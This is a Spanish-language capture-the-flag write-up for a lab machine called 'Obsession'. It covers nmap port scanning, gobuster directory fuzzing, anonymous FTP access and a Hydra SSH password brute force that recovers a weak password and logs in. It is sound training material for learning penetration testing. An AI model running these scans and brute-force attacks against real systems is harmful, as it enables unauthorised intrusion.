# Obsession
![image](https://github.com/user-attachments/assets/f802b7b6-123e-447a-b256-1b4ca7050e52)

## Reconocimiento y Enumeración.

Comprobar que la máquina está en marcha.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Una vez nos responde ping y ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.

Lanzamos nmap para ver que puertos nos encuentra.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
```
- `-sS`: Realiza un escaneo SYN.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `172.17.0.2`: La dirección IP del host objetivo.
```
```
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64

```
Como tenemos abierto el puerto 21,22,80, vamos a comprobar la versión y lanzar unos scripts básicos para ver que información obtenemos.

```bash
nmap -sCV -p21,22,80 -vvv -oN versionPorts 172.17.0.2
```
```
- `-sCV`: Escaneo de versiones y vulnerabilidades.
- `-p21,22,80`: Escaneo de los puertos.
- `-vvv`: Salida muy detallada y verbosa.
- `-oN versionPorts`: Guarda los resultados en "versionPorts".
- `172.17.0.2`: Dirección IP del host escaneado.
```
```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0             667 Jun 18 03:20 chat-gonza.txt
|_-rw-r--r--    1 0        0             315 Jun 18 03:21 pendientes.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBICJkT7eK4HDkyFx9Sdx52QBKAlOxD2HlDN9dnPLkFaFXa2pI5bRqIRDmJLAkBTyyx2/ifDUCyl0uGyB2ExHvQ8=
|   256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFYEzfToqDm7m3dRLdvXwcIhNZzbIgwquUJvnII1jjJn
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Russoski Coaching
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
```
Utilizamos **gobuster** para hacer fuzzing y ver si encontramos algo que nos pueda ser útil.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```
Mientras gobustar hace el esceno nos conectamos al **FTP** como *anonymous* y password da igual lo que pongamos, y nos descargamos los dos ficheros que están ahí.
```
ftp 172.17.0.2
mget *
```
Parece que en los ficheros no hay nada interesante, así que vemos el resultado del escaneo que habíamos dejado con **gobuster** y encontramos un direcotrio llamado **/backup**.
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 5208]
/backup               (Status: 301) [Size: 309] [--> http://172.17.0.2/backup/]
/important            (Status: 301) [Size: 312] [--> http://172.17.0.2/important/]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
```
Dentro del direcctorio **/backup** hay un archivo *.txt* que si lo abrimos tenemos imformación importante.

![image](https://github.com/user-attachments/assets/565355b9-55c3-4d29-9fd1-dc688c1c32d1)

Ya tenemos un posible usuario ***russoski***, así que como teníamos el puerto 22 abierto vamos a probar con hydra y fuerza bruta a conectarnos.
```
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
Obtenemos la contraseña **iloveme** y nos conectamos con el usuario **russoski**

![image](https://github.com/user-attachments/assets/3783b387-3dc9-453a-a250-bbaea68587bf)

```
ssh russoski@172.17.0.2
```
![image](https://github.com/user-attachments/assets/9845a17f-484d-46fc-8ec5-40acc68ed421)
